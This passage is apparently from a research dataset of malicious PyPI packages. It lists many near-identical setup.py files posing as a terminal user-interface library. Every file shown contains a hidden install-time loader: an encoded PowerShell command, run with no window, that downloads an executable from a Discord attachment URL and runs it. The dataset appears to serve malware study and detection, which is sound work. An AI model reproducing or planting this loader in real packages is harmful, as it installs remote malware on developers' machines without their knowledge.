['modlib'],\n    version = '7.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfstudycontrolpush-v5.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstudycontrolpush',\n    packages = ['modlib'],\n    version = '10.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfstudyhydrakill-v6.95",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstudyhydrakill',\n    packages = ['modlib'],\n    version = '4.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selftoolinfover-v2.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selftoolinfover',\n    packages = ['modlib'],\n    version = '1.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selftoolpyint-v4.99",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selftoolpyint',\n    packages = ['modlib'],\n    version = '5.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfurlminecontrol-v5.72",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfurlminecontrol',\n    packages = ['modlib'],\n    version = '8.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfurlrandomver-v2.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfurlrandomver',\n    packages = ['modlib'],\n    version = '2.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfverccint-v1.92",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfverccint',\n    packages = ['modlib'],\n    version = '5.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfverpushget-v6.79",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfverpushget',\n    packages = ['modlib'],\n    version = '7.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfvisagrandurl-v1.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisagrandurl',\n    packages = ['modlib'],\n    version = '10.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcandykillget-v5.20",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcandykillget',\n    packages = ['modlib'],\n    version = '10.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcandyminead-v7.84",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcandyminead',\n    packages = ['modlib'],\n    version = '5.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpccguipip-v7.34",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpccguipip',\n    packages = ['modlib'],\n    version = '3.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpccintelcontrol-v7.28",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpccintelcontrol',\n    packages = ['modlib'],\n    version = '10.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpcontrolpywreplace-v8.2",
